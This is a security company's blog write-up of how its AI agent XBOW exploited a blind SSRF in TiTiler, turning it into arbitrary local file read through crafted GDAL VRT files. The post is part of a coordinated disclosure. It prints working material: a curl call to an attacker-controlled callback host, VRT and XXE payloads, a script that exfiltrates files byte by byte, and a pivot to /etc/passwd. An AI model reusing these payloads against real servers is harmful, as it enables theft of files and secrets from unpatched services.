---
date: '2025-07-29'
description: XbOw identified and exploited a blind SSRF vulnerability in the TiTiler
  application, allowing arbitrary file reading through a series of methodical steps.
  By leveraging the application's use of GDAL's Virtual Raster Format (VRT), XbOw
  ingeniously crafted VRT files to extract pixel data representing file content. This
  multifaceted approach evolved from URL manipulation to byte-by-byte exfiltration,
  ultimately revealing sensitive data. The research highlights significant implications
  for SSRF vulnerabilities in public-facing services, underscoring the need for stringent
  access controls and input validation, especially for applications utilizing complex
  file handling libraries like GDAL.
link: https://xbow.com/blog/xbow-titiler-lfi/
tags:
- GDAL
- File Reading
- Vulnerability Exploitation
- Bug Bounty
- SSRF
title: XBOW – Another Byte Bites the Dust - How XBOW Turned a Blind SSRF into a File
  Reading Oracle
---

# Another Byte Bites the Dust - How XBOW Turned a Blind SSRF into a File Reading Oracle

### July 28, 2025

### Alvaro Muñoz

#### Security Researcher

* * *

After announcing that XBOW was [the top bug bounty hunter in the US](https://xbow.com/blog/top-1-how-xbow-did-it/), we were flooded with requests to share some of its most intriguing discoveries. The one I’m about to share is probably my favorite (and I have seen a lot of really interesting and mind blowing exploits). Unfortunately, we are not able to share the name of the Hacker One program XBOW found this vulnerability in, but since it’s an OSS project and the issue has been fixed, we will be sharing the details of how XBOW found this bug redacting any mentions to the vulnerable servers. We’re excited to reveal how XBOW successfully exploited an application designed for rendering map tiles from various geospatial data formats. The result? A complete arbitrary local file read vulnerability achieved through an ingenious byte-by-byte exfiltration technique.

The vulnerable application is called TiTiler, an application designed for rendering map tiles from various geospatial data formats. XBOW’s assessment of the application led to a complete arbitrary local file read vulnerability, achieved through an ingenious byte-by-byte exfiltration technique.

### From URL to Arbitrary File Read in 48 Steps

#### The Journey Begins

XBOW started its reconnaissance by exploring the target application, immediately hitting a 403 Forbidden response. Rather than being deterred, it used concurrent Python requests to test common API paths. This systematic approach quickly paid off with two critical discoveries:

```
The previous step revealed two interesting endpoints:

1. `/ping`: Returns `healthy` with status 200. This is a common health check endpoint and usually doesn't offer much attack surface, but good to note.
2. `/openapi.json`: Returns a large JSON file (402535 bytes) with status 200. This is very promising, as an OpenAPI (Swagger) definition file describes the API structure, including paths,
parameters, and sometimes even authentication methods. This will be invaluable for finding potential SSRF vulnerabilities.

Our next step is to retrieve and analyze the `/openapi.json` file. This will give us a detailed map of the API and help us identify endpoints that might accept URLs or other external resource references as parameters.
```

![](https://xbow.com/sparkle-white.webp)

The OpenAPI documentation was a goldmine. Since XBOW was specifically tasked with finding SSRF vulnerabilities, it immediately began scanning for endpoints that accepted URL parameters. The search revealed multiple promising candidates, all related to geospatial data processing:

- COG (Cloud Optimized GeoTIFF) endpoints
- STAC (SpatioTemporal Asset Catalog) handlers
- MosaicJSON processors

These endpoints typically allow users to specify remote dataset URLs for server-side processing - a classic SSRF scenario waiting to be exploited.

#### First Contact: Confirming the SSRF

XBOW’s initial test was straightforward: it attempted to access a controlled interactsh server through the `/cog/info` endpoint. The test confirmed the vulnerability immediately:

```
$ curl -v "https://[REDACTED]/cog/info?url=http://d12gh236h0ste95n4j40tyeko35ipgg8z.xfil.xbow.ltd/test_ssrf"
```

![](https://xbow.com/sparkle-white.webp)

The interactsh server received both HEAD and GET requests from the target, with the GET request including a Range header attempting to read bytes 0-71.

```
Great progress! We've confirmed that we have a working Server-Side Request Forgery (SSRF) vulnerability. The target server made requests to our interactsh domain, which is evident from the interactsh callbacks we received:

1. We got an HTTP HEAD request from the target server to our interactsh domain
2. Followed by an HTTP GET request with a Range header, trying to read bytes 0-71

The server returned a 500 error with:
`{"detail":"'/vsicurl/http://d12gh236h0ste95n4j40tyeko35ipgg8z.xfil.xbow.ltd/test_ssrf' not recognized as a supported file format."}`

This error gives us valuable information:
- The target application is trying to process our URL as a file format (likely expecting a geospatial file format like GeoTIFF)
- It's using GDAL's virtual file system (VSI) with cURL driver (/vsicurl/) to access remote files

Now that we've confirmed the SSRF is working for HTTP requests, let's try to access the target flag URL.
```

![](https://xbow.com/sparkle-white.webp)

However, the server responded with an error that revealed crucial information:

`{"detail":"'/vsicurl/http://d12gh236h0ste95n4j40tyeko35ipgg8z.xfil.xbow.ltd/test_ssrf' not recognized as a supported file format."}`

This error was incredibly valuable - it revealed that the application was using GDAL’s Virtual File System (VSI) with the cURL driver ( `/vsicurl/`) to access remote files, expecting them to be in geospatial formats like GeoTIFF.

When XBOW attempted to directly access the flag at `http://[REDACTED]/`, it encountered its first major hurdle:

`{"detail":"Failed to find <imageAttributes> in document."}`

This response indicated that while the HTTP request succeeded, the server expected XML data with specific `<imageAttributes>` tags. The flag content didn’t conform to the expected XML schema, so the server refused to process it further.

#### The Breakthrough: VRT Files to the Rescue

Faced with this formatting constraint, XBOW had a brilliant insight: if direct flag access wasn’t possible, perhaps it could use an indirect approach. Enter VRT (Virtual Raster Format) files - XML-based GDAL files that can define datasets by referencing other files, including remote ones.

XBOW crafted its first VRT file:

```
The current attempt with `/cog/point/0,0?url=http://[REDACTED]/` still results in the error `{"detail":"Failed to find <imageAttributes> in document."}`. This indicates that even the `/cog/point/` endpoint is trying to parse the response from the provided URL as an XML document and
expects an `<imageAttributes>` tag. This behavior seems consistent across the COG-related endpoints we've tried.

Since the application is using GDAL's `/vsicurl/` and expects a specific file format (likely a raster/geospatial format like GeoTIFF, but it's trying to parse XML first for metadata), we can try to leverage GDAL's VRT (Virtual Raster Format) files. VRT files are XML-based and can define
datasets by referencing other files, including remote ones. They are powerful and might allow us to:
1. Embed the content of the flag URL within the VRT file itself, possibly in a metadata field.
2. Or, if direct embedding doesn't work or is sanitized, use it to trigger an error message that might contain the flag content if the flag URL is used as a "source" and the parser tries to interpret it as a valid dataset.

The key is that VRT files *are* a supported format by GDAL.

Let's create a VRT file that attempts to include the flag content within a metadata tag or as a CData section. We'll use the HTTPS version of the flag URL within the VRT, hoping that GDAL's internal cURL might handle the SSL certificate issue more gracefully or differently, or that the VRT parser might not strictly enforce SSL if it's fetching a "sub-dataset". If not, we can try HTTP.

The VRT file will be very simple, just enough to be recognized as a VRT and to include our payload.

<VRTDataset rasterXSize="1" rasterYSize="1">
  <Metadata>
    <MDI key="FLAG_CONTENT">/vsicurl/https://[REDACTED]/</MDI>
  </Metadata>
  <VRTRasterBand dataType="Byte" band="1">
    <SimpleSource>
      <SourceFilename relativeToVRT="0">/vsicurl/https://[REDACTED]/</SourceFilename>
      <SourceBand>1</SourceBand>
      <SourceProperties RasterXSize="1" RasterYSize="1" DataType="Byte" BlockXSize="1" BlockYSize="1" />
      <SrcRect xOff="0" yOff="0" xSize="1" ySize="1" />
      <DstRect xOff="0" yOff="0" xSize="1" ySize="1" />
    </SimpleSource>
  </VRTRasterBand>
</VRTDataset>
```

![](https://xbow.com/sparkle-white.webp)

This VRT file was successfully recognized by the server (receiving a 200 OK response), confirming that GDAL could process VRT files and had likely attempted to access the referenced flag URL.

#### Exploring the GDAL Ecosystem

XBOW was on step 21 at this point. At this point, XBOW started using its deep knowledge of GDAL’s capabilities and systematically tested various Virtual File System (VFS) modules such as:

- `/vsihttp/`: An alternative to `/vsicurl/` without cURL dependencies
- `/vsicurl_streaming/`: A streaming variant that might handle SSL differently
- `/vsizip/` and `/vsitar/`: For compressed archive handling
- `/vsimem/`: For in-memory file operations
- `/vsiwebhdfs/` and `/vsistdin/`: Additional specialized handlers

During the following steps XBOW also experimented with embedding Python code within VRT files:

```
<VRTDataset rasterXSize="1" rasterYSize="1">
  <Metadata>
    <MDI key="PYTHON_SCRIPT">
import urllib.request
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

try:
    response = urllib.request.urlopen('https://[REDACTED]/', context=ctx)
    flag_content = response.read().decode('utf-8')
    print(f"FLAG CONTENT: {flag_content}")
    import gdal
    ds = gdal.GetDriverByName('MEM').Create('', 1, 1, 1)
    ds.SetMetadataItem('FLAG', flag_content)
except Exception as e:
    print(f"Error: {e}")
    import gdal
    ds = gdal.GetDriverByName('MEM').Create('', 1, 1, 1)
    ds.SetMetadataItem('ERROR', str(e))
    </MDI>
  </Metadata>
  <VRTRasterBand dataType="Byte" band="1">
    <PythonSource>
      import numpy as np
      def raster_function(in_ar, out_ar, xoff, yoff, xsize, ysize, raster_xsize, raster_ysize, r, gt, **kwargs):
          out_ar.fill(1)
          return 0
    </PythonSource>
  </VRTRasterBand>
</VRTDataset>
```

And attempted XXE (XML External Entity) attacks:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://[REDACTED]/"> ]>
<VRTDataset rasterXSize="1" rasterYSize="1">
  <Metadata>
    <MDI key="DESCRIPTION">&xxe;</MDI>
  </Metadata>
  <VRTRasterBand dataType="Byte" band="1">
    <ColorInterp>Gray</ColorInterp>
  </VRTRasterBand>
</VRTDataset>
```

But let’s fast forward to step 41 where XBOW had a major breakthrough.

#### The Eureka Moment: Raw Pixel Data

At step 41, XBOW had its breakthrough insight. If the server was interpreting file contents as pixel data, why not leverage this behavior? The idea was elegant: create a VRT that treats the flag content as raw pixel data, then extract it from the resulting image.

```
Let's try one final VRT. This VRT will define a very small raster (1x1 pixel). The pixel data itself will be sourced from `/vsicurl/http://[REDACTED]/`. If the flag text is short and GDAL tries to
interpret it as raw pixel data (e.g., a single byte value for a Byte raster band), it might work, or the error in trying to cast "FLAG{...}" to a byte might be revealing.
We will use the `/cog/preview.png` endpoint, as this tries to render an image. If it tries to render "FLAG{...}" as pixel data, the resulting "image" (or error image) might contain the flag.
```

![](https://xbow.com/sparkle-white.webp)

```
import urllib.parse
import subprocess
import time

# VRT that attempts to use the flag URL as raw pixel data source
# Define a small raster, e.g., 10x1 pixels if flag is ~10 chars.
# We don't know flag length, so start small.
# VRTRawRasterBand is for reading raw binary data.
# If flag is "FLAG{test}", ASCII values are F=70, L=76, A=65, G=71, etc.
# These could be pixel values.

# Assuming flag is relatively short, try to read it as a 1-row image.
# Let's guess a flag length of up to 64 characters for the raster width.
flag_max_len_guess = 64

vrt_raw_source_content = f"""<VRTDataset rasterXSize="{flag_max_len_guess}" rasterYSize="1">
<VRTRasterBand dataType="Byte" band="1" subClass="VRTRawRasterBand">
  <SourceFilename relativeToVRT="0">/vsicurl/http://[REDACTED]/</SourceFilename>
  <ImageOffset>0</ImageOffset> <!-- Start reading from byte 0 -->
  <PixelOffset>1</PixelOffset> <!-- Each pixel is 1 byte -->
  <LineOffset>{flag_max_len_guess}</LineOffset> <!-- Bytes per line -->
  <ByteOrder>LSB</ByteOrder> <!-- Not critical for Byte data -->
</VRTRasterBand>
</VRTDataset>"""

---- OMMITTED FOR BREVITY ----
```

![](https://xbow.com/sparkle-white.webp)

The `/cog/preview.png` endpoint successfully processed this VRT, returning a 64x1 pixel PNG image where each pixel’s value corresponded to a byte from the flag URL!

```
We've successfully fetched `output.png` (157 bytes, 64x1 pixels, 8-bit gray+alpha). This is the rendered output of our VRT file that sources its raw pixel data directly from `http://[REDACTED]/`.
The flag is embedded as pixel data in this image.

The `hexdump` shows the PNG structure. The critical part is the `IDAT` chunk, which contains the compressed pixel data.
`IDAT 08 99 3d cd 3b 0a c2 30 00 00 d0 67 b0 d1 c1 d1 43 38 98 a5 f8 41 70 71 f7 c8 82 a3 82 25 a8
57 29 42 15 4c dc 7c 17 78 a3 7d 5d 9a 79 ab 9e 3a ad 95 6c 21 7a 89 e6 4e 92 bb 22 1a 4c 25 57 1b
0f c1 d7 c7 44 90 54 37 6b 54 8d 8b ad ac 08 0a c6 82 aa 6a 0c 8e ce 7a 07 59 a7 d5 db fd cf 1f 34
79 21 3f c2 d4 e3 91`

The image is 64x1 pixels, 8-bit gray+alpha. This means each pixel has two bytes: Gray value, Alpha value.
The VRT was defined as `dataType="Byte"`, which means it reads 1 byte per "sample". For Gray+Alpha, it would read Gray, then Alpha, then Gray, then Alpha, etc.
Since the VRT's `<VRTRasterBand>` was singular and specified `dataType="Byte"`, it's likely interpreting the fetched stream as a sequence of 8-bit grayscale values. The "gray+alpha" from `file` command might be how the PNG encoder chose to save it, perhaps defaulting alpha to 255 (opaque) for each grayscale pixel read from the source.

The content of `http://[REDACTED]/` is directly translated into the pixel values. Since we set `rasterXSize="64"`, it read up to 64 bytes from the flag URL. Each byte became a grayscale pixel value.

We need to:
1. Extract the raw pixel data from the IDAT chunk.
2. Decompress it (zlib).
3. Interpret the resulting bytes as ASCII characters.

The IDAT chunk data begins after `IDAT` and its length (which is not explicitly shown in this `hexdump` snippet but is part of the PNG chunk structure). The actual compressed data starts at `08
99 ...` (assuming `08 99` is the zlib header/compression method flags). The actual pixel data in a PNG scanline is often prepended with a filter type byte (0 for none). For a 64x1 8-bit grayscale image, we expect 64 bytes of pixel data, plus 1 filter byte for the scanline. If it's Gray+Alpha, it
would be 128 bytes + 1 filter byte. The `file` command said "8-bit gray+alpha", which is 2 bytes perpixel. So, 64 pixels * 2 bytes/pixel = 128 bytes of pixel data. Plus 1 filter byte per scanline.
Total = 129 bytes after decompression.

The compressed data in the IDAT chunk is `3d cd 3b ... e3 91`. (Length of IDAT chunk content is 0x64 = 100 bytes).

Let's use Python to decompress the IDAT data and interpret it.
The IDAT chunk starts at offset 0x25 (`49 44 41 54`) in the hexdump. The actual data follows.
The length of the IDAT chunk is 0x00000064 (100 bytes), as seen at offset 0x21.
So, 100 bytes of compressed data starting from offset 0x25 + 4 (after "IDAT") = 0x29.
The compressed data is from `08 99 3d ... e3 91`. No, the `08 99` is part of it. The 100 bytes start with `08 99`.

The data appears to be:
`08 99 3d cd 3b 0a c2 30 00 00 d0 67 b0 d1 c1 d1 43 38 98 a5 f8 41 70 71 f7 c8 82 a3 82 25 a8 57 29
42 15 4c dc 7c 17 78 a3 7d 5d 9a 79 ab 9e 3a ad 95 6c 21 7a 89 e6 4e 92 bb 22 1a 4c 25 57 1b 0f c1
d7 c7 44 90 54 37 6b 54 8d 8b ad ac 08 0a c6 82 aa 6a 0c 8e ce 7a 07 59 a7 d5 db fd cf 1f 34 79 21
3f c2 d4 e3 91`
This is 100 bytes.
```

![](https://xbow.com/sparkle-white.webp)

This is the image that XBOW got:

![The 'image' that held the secret: A visual representation of the raw pixel data containing the flag.](https://xbow.com/_astro/image2.CUTKPK3D_JECIv.webp)

#### Decoding the Hidden Message

The returned PNG contained the flag data compressed within its IDAT chunk. XBOW’s analysis revealed:

- Image dimensions: 64x1 pixels, 8-bit gray+alpha
- IDAT chunk: 100 bytes of compressed data
- Decompressed 129 bytes (1 filter byte + 128 pixel bytes)

The first attempt to decompress the IDAT chunk failed:

```
Decompressed data length: 129
Decompressed data (hex):
013cff2c000c00f900ff00d200cc0032003400ce0028000600f50006001400bc002d00d000fe000600f80008002d00c800
00d1000200fd00fa00070002002d00ff00cb0035000000ff000500c7003700ce00fe000200fe00000004000200ff00ff00
00f8004c00bf00f3004100ce00cc003200f30039000c00f900ff00d200

Raw decompressed data as string (potential flag):
Scanline filter type: 1
Interpreted as Gray+Alpha (Gray values as chars): <,
                                                ùÿÒÌ24Î(õ¼-Ðþ-È6Ñýú-ÿË5ÿÇ7ÎþþÿÿøL¿óAÎÌ2ó9
                                                                                          ùÿÒ
Candidate Flag (from Gray values): <,

```

The crucial insight was that PNG scanlines use filtering algorithms. The data wasn’t raw - it was filtered using the Sub filter (type 1), where each byte represents the difference from the previous pixel. XBOW implemented the unfiltering algorithm:

```
The Python script successfully decompressed the IDAT chunk.
- Decompressed data length: 129 bytes. This matches our expectation for a 64x1 8-bit Gray+Alpha PNG (1 filter byte + 64 pixels * 2 bytes/pixel = 129 bytes).
- Scanline filter type: 1 (Sub filter). This is important. The pixel values are not raw; they are differences from the previous pixel (or a fixed value for the first pixel).

We need to unfilter the scanline data. The filter type 1 (Sub) means:
`FilteredByte = OriginalByte - OriginalByte_of_previous_pixel` (for the same channel) `OriginalByte = FilteredByte + OriginalByte_of_previous_pixel` (modulo 256)

The `pixel_data_raw` (128 bytes) contains the filtered G, A, G, A, ... values.
Since it's Gray+Alpha, `bytes_per_pixel = 2`.
For `Sub` filter:
`Recon(x) = Filt(x) + Recon(x - bpp)` (where bpp is bytes per pixel)
For the first `bpp` bytes, `Recon(x) = Filt(x)`.

Let's unfilter the data:
`pixel_data_raw = decompressed_data[1:]`
`bpp = 2` (Gray, Alpha)
`unfiltered_pixel_data = bytearray(len(pixel_data_raw))`

For `i` from 0 to `len(pixel_data_raw) - 1`:
  If `i < bpp`:
    `unfiltered_pixel_data[i] = pixel_data_raw[i]`
  Else:
    `unfiltered_pixel_data[i] = (pixel_data_raw[i] + unfiltered_pixel_data[i - bpp]) % 256`

After unfiltering, the Gray values will be at indices `0, 2, 4, ...` of `unfiltered_pixel_data`.
These are our flag characters.
```

![](https://xbow.com/sparkle-white.webp)

After unfiltering and extracting the gray channel values, XBOW successfully decoded: `<html>`

```
Filter type: 1
Filtered scanline data length: 128
Unfiltered scanline data (hex):
3cff68ff74ff6dff6cff3eff0aff3cff70ff3eff66ff6cff61ff67ff7bff37ff64ff34ff32ff38ff30ff38ff65ff2dff63
34ff36ff33ff2dff34ff36ff63ff62ff2dff62ff62ff61ff66ff2dff64ff32ff30ff32ff30ff30ff34ff36ff35ff34ff39
31ff7dff3cff2fff70ff3eff0aff3cff2fff68ff74ff6dff6cff3eff

Candidate Flag: <html>
```

The candidate flag was promising, we just need more of it! With the technique proven, XBOW expanded the VRT to read larger amounts of

```
Our VRT's `VRTRawRasterBand` read the beginning of this HTML page as raw bytes.
We need to see more of this HTML page. Our VRT was `rasterXSize="64"`, so it read 64 bytes of the HTML page. The content `<html>\n<...` is consistent with this.

We need to make the VRT read more data.
- Change `rasterXSize` to a larger value, e.g., 512 or 1024, to capture more of the HTML.
- The `LineOffset` in the VRT should match `rasterXSize`.

Let's create a new VRT that attempts to read, say, the first 512 bytes.

# VRT to read 512 bytes instead of 64
vrt_content = f"""<VRTDataset rasterXSize="512" rasterYSize="1">
  <VRTRasterBand dataType="Byte" band="1" subClass="VRTRawRasterBand">
    <SourceFilename relativeToVRT="0">/vsicurl/http://[REDACTED]/</SourceFilename>
    <ImageOffset>0</ImageOffset>
    <PixelOffset>1</PixelOffset>
    <LineOffset>512</LineOffset>
    <ByteOrder>LSB</ByteOrder>
  </VRTRasterBand>
</VRTDataset>"""
```

![](https://xbow.com/sparkle-white.webp)

This successfully extracted the complete flag:

```
Attempting to render more data as raw pixel data via VRT.
Fetching:
https://[REDACTED]/cog/preview.png?url=http%3A%2F%2F18.226.248.200%2Fpentester0%2F
t_more_data.vrt%3Fcb%3D1749355457&max_size=2048
Output image created: /home/pentester0/more_data_output.png, Size: 166 bytes
Extracted IDAT data length: 109
Filter type: 1

Decoded HTML content part (512 bytes from Gray channel):
--------------------
<html>
<p>flag{7d42808e-c463-46cb-bbaf-d20200465491}</p>
</html>

--------------------
```

#### From Network to Local: File System Access

With SSRF-to-file-read proven, XBOW’s coordinator agent decided to test local file access. The transition was simple but powerful - replacing the network URL with a local file path:

```
<SourceFilename relativeToVRT="0">/etc/passwd</SourceFilename>
```

This opened the door to arbitrary local file reading using the same pixel-data extraction technique.

#### Creative Alternatives: Statistical Analysis

This vulnerability was discovered not once, but twice by XBOW! In a parallel run, XBOW took a similar but particularly creative approach, XBOW discovered that the `/cog/statistics` endpoint could be used to analyze the histogram of byte values in files:

```
Let's try this. `SourceFilename` will be `/vsicurl/http://[REDACTED]/METADATA.DIM`.
The `/cog/statistics` endpoint should then be able to calculate statistics on the ASCII values of the flag.
The `histogram` in the statistics output will show counts of each byte value (ASCII char).
This will leak the flag's characters and their frequencies. If the flag is short and unique enough, I can reconstruct it.
Or, if `/cog/preview.png` (or other image-returning endpoints) can render this VRT, it would render the flag as an image.
```

![](https://xbow.com/sparkle-white.webp)

The `/statistics` endpoint returned a 200 OK response with the following JSON:

```
--- Testing /cog/statistics with raw VRT: http://18.119.135.186/pentester0/raw_read.vrt ---
Status: 200
Response:
{"b1":{"min":0.0,"max":121.0,"mean":53.296875,"count":64.0,"sum":3411.0,"std":46.622379178184104,"
dian":60.0,"majority":0.0,"minority":97.0,"unique":14.0,"histogram":[[25.0,3.0,6.0,6.0,2.0,2.0,4.0\
.0,4.0,2.0,2.0,2.0,2.0,2.0],[0.0,47.0,60.0,62.0,97.0,98.0,100.0,101.0,104.0,108.0,109.0,111.0,116.\
121.0]],"valid_percent":100.0,"masked_pixels":0.0,"valid_pixels":64.0,"percentile_98":119.70000000
0002,"percentile_2":0.0}}
```

```
SUCCESS with /cog/statistics! The raw bytes were read.
The 'histogram' array in the JSON response for 'b1' will show counts of each byte value (0-255).
These byte values are the ASCII codes of the characters in the target file.
If the flag is short (e.g., < 64 chars), we can reconstruct it from the histogram.

Histogram counts: [25.0, 3.0, 6.0, 6.0, 2.0, 2.0, 4.0, 2.0, 4.0, 2.0, 2.0, 2.0, 2.0, 2.0]
Histogram bin values: [0.0, 47.0, 60.0, 62.0, 97.0, 98.0, 100.0, 101.0, 104.0, 108.0, 109.0, 111.0\
116.0, 121.0]

Characters present in the first 64 bytes (from histogram, order lost): /<>abdehlmoty
```

![](https://xbow.com/sparkle-white.webp)

The histogram revealed character frequencies and could be used to reconstruct file contents. Converting the byte values to ASCII revealed characters like `'/'`, `'<'`, `'>'`, `'a'`, `'b'`, `'d'`, `'e'`, `'h'`, `'l'`, `'m'`, `'o'`, `'t'`, `'y'` \- clearly indicating XML content structure (The real content of `http://[REDACTED]/METADATA.DIM` was just `<html><head></head><body></body></html>`)

This was pretty cool but not very practical. Let’s let XBOW explain why and plot a different approach.

```
This is excellent progress! The VRT with `VRTRawRasterBand` successfully read the raw bytes from
`http://[REDACTED]/METADATA.DIM` and I got the statistics:

Key findings from the histogram:
- The file is 64 bytes long (count: 64.0)
- It contains 14 unique byte values: [0, 47, 60, 62, 97, 98, 100, 101, 104, 108, 109, 111, 116, 121]
- Converting to ASCII: [null, '/', '<', '>', 'a', 'b', 'd', 'e', 'h', 'l', 'm', 'o', 't', 'y']
- There are 25 null bytes (0x00), which suggests padding or structure
- The characters include '<', '>', which strongly suggests XML content
- The characters 'a', 'b', 'd', 'e', 'h', 'l', 'm', 'o', 't', 'y' could form words like "the",
"body", "holm", etc.

The presence of '<' and '>' confirms this is XML content, which aligns with the GDAL error "Failed
to find <imageAttributes> in document." from earlier tests.

The histogram shows frequency but not order. However, I can get the raw pixel values in order by
using an endpoint that returns the actual image data or pixel values.
```

![](https://xbow.com/sparkle-white.webp)

That last idea was simple but brilliant; try different endpoints such as `/cog/crop` and `/cog/point` to try to fetch individual pixels:

```
My primary goal now is to get the ordered sequence of the 64 bytes from the VRT. The
`/cog/point/{lon},{lat}` endpoint is the most promising for this. In a VRT defined as
`rasterXSize="64" rasterYSize="1"`, the "longitude" can be treated as the x-coordinate (0 to 63) and
"latitude" as the y-coordinate (0).
```

![](https://xbow.com/sparkle-white.webp)

First attempt failed, but XBOW motto is to try harder:

```
The `/cog/point` endpoint failed with `{"detail":"CRS is invalid: None"}`. This indicates that the
VRT doesn't have a proper Coordinate Reference System defined, so the point endpoint can't map
geographic coordinates to pixel positions.

Let me fix the VRT by adding a proper CRS and GeoTransform. The current VRT is missing proper
georeferencing. I need to create a new VRT that defines a proper coordinate system so that I can
query specific pixel positions.

Alternatively, I can try a different approach: create a very small VRT (like 1x1 or 8x1) and
systematically read different byte offsets from the target file by adjusting the `ImageOffset`
parameter in the `VRTRawRasterBand`. This way I can read the file byte by byte.
```

![](https://xbow.com/sparkle-white.webp)

#### Precision Reading: Byte-by-Byte Exfiltration

XBOW hit a wall again, but then its creative problem-solving kicked in. What about combining the two approaches? Let’s try a VRT that reads a single byte but instead of fetching the image, let’s fetch the histogram of the byte values. This will reveal the flag bytes.

```
Let me try a different approach: creating multiple small VRT files that each read a single byte from
different offsets in the target file. This way I can use the `/cog/statistics` endpoint (which
worked before) to get the value of each individual byte.
```

![](https://xbow.com/sparkle-white.webp)

For the ultimate precision, XBOW developed a technique to read files one byte at a time by adjusting the `ImageOffset` parameter:

```
...

# I'll read the first 32 bytes to start with (to avoid too many requests)
# If this works, I can extend to all 64 bytes
num_bytes_to_read = 32

raw_bytes = [None] * num_bytes_to_read

for offset in range(num_bytes_to_read):
    print(f"Reading byte at offset {offset}...")

    # Create a VRT that reads 1 byte from the specified offset
    vrt_content = f"""<VRTDataset rasterXSize="1" rasterYSize="1">
      <VRTRasterBand dataType="Byte" band="1" subClass="VRTRawRasterBand">
        <SourceFilename relativeToVRT="0">/vsicurl/{target_file}</SourceFilename>
        <ImageOffset>{offset}</ImageOffset>
        <PixelOffset>1</PixelOffset>
        <LineOffset>1</LineOffset>
        <ByteOrder>LSB</ByteOrder>
      </VRTRasterBand>
    </VRTDataset>
    """
...
```

![](https://xbow.com/sparkle-white.webp)

This technique could systematically extract any file, one byte at a time, with perfect accuracy.

```
Creating multiple 1x1 VRT files to read individual bytes from different offsets...
 ======================================================================
 Reading byte at offset 0...
   Offset 0: 60 ('<')
 Reading byte at offset 1...
   Offset 1: 104 ('h')
 Reading byte at offset 2...
   Offset 2: 116 ('t')
 Reading byte at offset 3...
   Offset 3: 109 ('m')
 Reading byte at offset 4...
   Offset 4: 108 ('l')
 Reading byte at offset 5...
   Offset 5: 62 ('>')
 Reading byte at offset 6...
   Offset 6: 60 ('<')
 Reading byte at offset 7...
   Offset 7: 104 ('h')
 Reading byte at offset 8...
   Offset 8: 101 ('e')
 Reading byte at offset 9...
   Offset 9: 97 ('a')
 Reading byte at offset 10...
   Offset 10: 100 ('d')
 Reading byte at offset 11...
   Offset 11: 62 ('>')
 Reading byte at offset 12...
   Offset 12: 60 ('<')
 Reading byte at offset 13...
   Offset 13: 47 ('/')
 Reading byte at offset 14...
   Offset 14: 104 ('h')
 Reading byte at offset 15...
   Offset 15: 101 ('e')
 Reading byte at offset 16...
   Offset 16: 97 ('a')
 Reading byte at offset 17...
   Offset 17: 100 ('d')
 Reading byte at offset 18...
   Offset 18: 62 ('>')
 Reading byte at offset 19...
   Offset 19: 60 ('<')
 Reading byte at offset 20...
   Offset 20: 98 ('b')
 Reading byte at offset 21...
   Offset 21: 111 ('o')
 Reading byte at offset 22...
   Offset 22: 100 ('d')
 Reading byte at offset 23...
   Offset 23: 121 ('y')
 Reading byte at offset 24...
   Offset 24: 62 ('>')
 Reading byte at offset 25...
   Offset 25: 60 ('<')
 Reading byte at offset 26...
   Offset 26: 47 ('/')
 Reading byte at offset 27...
   Offset 27: 98 ('b')
```

Having read the first 64 bytes of `http://[REDACTED]/METADATA.DIM` using the VRT byte-by-byte technique with `/cog/statistics`, all its left to do is to point the script to the flag:

```
Attempting to read from ROOT URL: http://[REDACTED]/ byte-by-byte using VRTs.
This is where the problem statement says the flag should be.
======================================================================
Progress: Reading byte 0...
  Offset 0: 60 ('<')
  Offset 2: 116 ('t')
  Offset 10: 102 ('f')
  Offset 14: 123 ('{')
  Offset 16: 100 ('d')
Progress: Reading byte 20...
  Offset 20: 48 ('0')
  Offset 24: 99 ('c')
  Offset 30: 54 ('6')
  Offset 31: 99 ('c')
  Offset 37: 102 ('f')
  Offset 39: 100 ('d')
Progress: Reading byte 40...
  Offset 40: 50 ('2')
  Offset 49: 57 ('9')
  Offset 50: 49 ('1')
  Offset 51: 125 ('}')
Progress: Reading byte 60...
  Offset 60: 116 ('t')
  Offset 65: 0 ('<00>')
  Offset 66: 0 ('<00>')
  Offset 67: 0 ('<00>')
  Multiple null bytes detected, assuming end of content at offset 67.

--- Successfully read 68 bytes from http://[REDACTED]/ ---
Full ASCII content:
<html>\n<p>flag{7d42808e-c463-46cb-bbaf-d20200465491}</p>\n</html>\n\0\0\0

!!! Generic 'flag{' pattern found !!!
Content contains: <html><p>flag{7d42808e-c463-46cb-bbaf-d20200465491}</p></html>

[Execution time: 21606 ms.]
```

This time, it took 32 iterations to find and exploit a complex arbitrary file read/SSRF involving little-known formats and standards, hats off!

I loved this bug so much that I wrote a small TUI for it to watch it develop:

![](https://xbow.com/_astro/image18.6TbG_0cz_ZVD32c.webp)

### Impact

While the technical details of this exploit are fascinating, it’s crucial to understand the potential real-world impact of such a vulnerability. We assessed the impact by reading critical files such as `/proc/self/environ` and shared them via HackerOne which assigned a Critical (9.3) severity to the finding.

### The Remarkable Achievement

In just 32 steps and under 14 minutes, XBOW transformed a simple blind SSRF vulnerability into a complete arbitrary file read capability. The attack chain demonstrated:

1. **Reconnaissance**: Systematic API discovery and documentation analysis
2. **Vulnerability Identification**: SSRF confirmation through controlled testing
3. **Constraint Analysis**: Understanding GDAL’s format expectations
4. **Creative Problem Solving**: Leveraging VRT files as an intermediary
5. **Deep Technical Knowledge**: Understanding PNG compression, filtering, and GDAL internals
6. **Iterative Refinement**: Multiple approaches from bulk reading to byte-by-byte precision
7. **Horizontal Expansion**: Pivoting from network SSRF to local file access

What makes this particularly impressive is how XBOW seamlessly navigated complex technical domains - from web application security to geospatial data processing, from PNG image formats to GDAL virtual file systems. XBOW demonstrated not just technical knowledge but creative problem-solving that would challenge even experienced security researchers.

The elegance of the final solution - embedding arbitrary file contents as pixel data in generated images - showcases the kind of lateral thinking that makes XBOW such a formidable security testing tool. It didn’t just find a vulnerability; it crafted a complete data exfiltration framework that could be adapted for various scenarios.

This case study perfectly illustrates why XBOW has become the top bug bounty hunter in the US - it combines comprehensive technical knowledge with creative problem-solving and relentless persistence, all wrapped in an automated system that can work around the clock.

### Coordinated Disclosure Timeline

We want to thank the developers of [TiTiler](https://github.com/developmentseed/titiler) and [GDAL](https://gdal.org/) for their quick responses and willingness to engage in improving the security posture of their projects. Despite some initial delays, once contact was established, the teams acted promptly and transparently to address the issue.

Below is a breakdown of the timeline during the disclosure process:

#### Timeline

- **June 12, 2025**
We initially reported the vulnerability privately to the TiTiler maintainers. Unfortunately, we did not receive a response within the following two weeks.

